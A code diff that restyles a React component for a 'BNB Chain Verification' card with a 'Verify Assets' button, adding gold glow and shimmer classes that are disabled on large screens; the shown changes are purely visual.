@@ -50,18 +50,20 @@ const VerificationSection = ({
   const buttonText = isConnecting ? 'Connecting...' : isVerifying ? 'Verifying...' : 'Verify Assets';
 
   return (
-    <Card className="border border-border bg-card/50 backdrop-blur-sm overflow-hidden relative animate-fade-in">
+    <Card className="border border-border bg-card/50 backdrop-blur-sm overflow-hidden relative animate-fade-in golden-glow-strong lg:golden-glow-none">
+      <div className="absolute inset-0 bg-gold-radial opacity-100 lg:opacity-0" />
+      <div className="absolute inset-0 bg-gold-shimmer opacity-100 lg:opacity-0" />
       <CardContent className="pt-6 pb-8 relative z-10">
         {/* BNB Chain Verification Tag */}
-        <div className="inline-block px-4 py-1.5 border border-gold text-gold text-xs font-medium rounded-md mb-6 animate-slide-up">
+        <div className="inline-block px-4 py-1.5 border border-gold text-gold text-xs font-medium rounded-md mb-6 animate-slide-up golden-border-glow lg:golden-border-none golden-text-glow lg:golden-text-none">
           BNB CHAIN VERIFICATION
         </div>
 
         {/* Main content */}
         <div className="flex flex-col md:flex-row items-start justify-between gap-6">
           <div className="max-w-md animate-slide-up" style={{ animationDelay: '150ms' }}>
-            <h1 className="text-4xl font-bold mb-4">Secure Asset Verification</h1>
-            <p className="text-muted-foreground mb-6">
+            <h1 className="text-4xl font-bold mb-4 golden-text-glow lg:golden-text-none text-gold lg:text-foreground">Secure Asset Verification</h1>
+            <p className="text-muted-foreground/80 mb-6">
               Verify your BNB Chain assets with our advanced security protocol.
               Protect against scams and ensure your transactions are secure.
             </p>
@@ -69,7 +71,7 @@ const VerificationSection = ({
             <button 
               onClick={handleVerify}
               disabled={isLoading}
-              className="inline-flex h-10 items-center justify-center rounded bg-yellow-500 hover:bg-yellow-600 px-6 font-medium text-black transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
+              className="inline-flex h-10 items-center justify-center rounded bg-yellow-500 hover:bg-yellow-600 px-6 font-medium text-black transition-colors disabled:opacity-70 disabled:cursor-not-allowed golden-glow lg:golden-glow-none"
             >
               {isLoading ? (
                 <>
@@ -87,17 +89,17 @@ const VerificationSection = ({
 
           {/* BNB Logo */}
           <div className="hidden md:flex items-center justify-center animate-fade-in" style={{ animationDelay: '300ms' }}>
-            <div className="relative w-36 h-36 flex items-center justify-center animate-float">
+            <div className="relative w-36 h-36 flex items-center justify-center animate-float golden-glow lg:golden-glow-none">
               <div className="absolute inset-0 rounded-full border border-gold/20 animate-[spin_25s_linear_infinite]"></div>
               <div className="absolute inset-2 rounded-full border border-gold/15 animate-[spin_20s_linear_infinite_reverse]"></div>
               <div className="absolute inset-4 rounded-full border border-gold/10 animate-[spin_15s_linear_infinite]"></div>
               <div className="absolute inset-8 rounded-full border border-gold/10 flex items-center justify-center">
-                <div className="absolute h-2 w-2 rounded-full bg-gold -top-1 animate-pulse-glow"></div>
-                <div className="absolute h-2 w-2 rounded-full bg-gold -right-1 animate-pulse-glow" style={{ animationDelay: '400ms' }}></div>
-                <div className="absolute h-2 w-2 rounded-full bg-gold -bottom-1 animate-pulse-glow" style={{ animationDelay: '800ms' }}></div>
-                <div className="absolute h-2 w-2 rounded-full bg-gold -left-1 animate-pulse-glow" style={{ animationDelay: '1200ms' }}></div>
+                <div className="absolute h-2 w-2 rounded-full bg-gold -top-1 animate-pulse-glow golden-glow lg:golden-glow-none"></div>
+                <div className="absolute h-2 w-2 rounded-full bg-gold -right-1 animate-pulse-glow golden-glow lg:golden-glow-none" style={{ animationDelay: '400ms' }}></div>
+                <div className="absolute h-2 w-2 rounded-full bg-gold -bottom-1 animate-pulse-glow golden-glow lg:golden-glow-none" style={{ animationDelay: '800ms' }}></div>
+                <div className="absolute h-2 w-2 rounded-full bg-gold -left-1 animate-pulse-glow golden-glow lg:golden-glow-none" style={{ animationDelay: '1200ms' }}></div>
               </div>
-              <div className="w-16 h-16 bg-gold/10 rounded-full flex items-center justify-center animate-pulse-glow">
+              <div className="w-16 h-16 bg-gold/10 rounded-full flex items-center justify-center animate-pulse-glow golden-border-glow lg:golden-border-none">
                 <svg
                   xmlns="http://www.w3.org/2000/svg"
                   width="32"
@@ -108,7 +110,7 @@ const VerificationSection = ({
                   strokeWidth="1.5"
                   strokeLinecap="round"
                   strokeLinejoin="round"
-                  className="text-gold"
+                  className="text-gold golden-text-glow lg:golden-text-none"
                 >
                   <path d="M12 2v8" />
                   <path d="m4.93 10.93 7.07 7.07" />
